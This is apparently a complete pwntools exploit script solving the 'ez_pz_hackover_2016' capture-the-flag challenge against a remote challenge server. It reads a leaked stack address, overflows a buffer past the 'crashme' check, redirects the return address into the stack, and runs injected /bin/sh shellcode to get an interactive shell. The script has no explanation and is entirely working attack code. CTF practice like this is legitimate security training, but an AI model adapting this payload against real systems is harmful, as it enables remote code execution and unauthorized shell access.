from pwn import *

context.log_level = 'debug'
# io = process('ez_pz_hackover_2016')
io = remote('node4.buuoj.cn', 28230)

io.recvuntil('Yippie, lets crash: ')
stack_addr = int(io.recvn(10), 16)
log.success('stack_addr: ' + hex(stack_addr))
shellcode = asm(shellcraft.sh())
payload = b'crashme\x00'
payload = payload.ljust(0x1a, b'a') + p32(stack_addr - 0x1c) + shellcode
gdb.attach(io)
pause()
io.sendlineafter('> ', payload)
io.interactive()

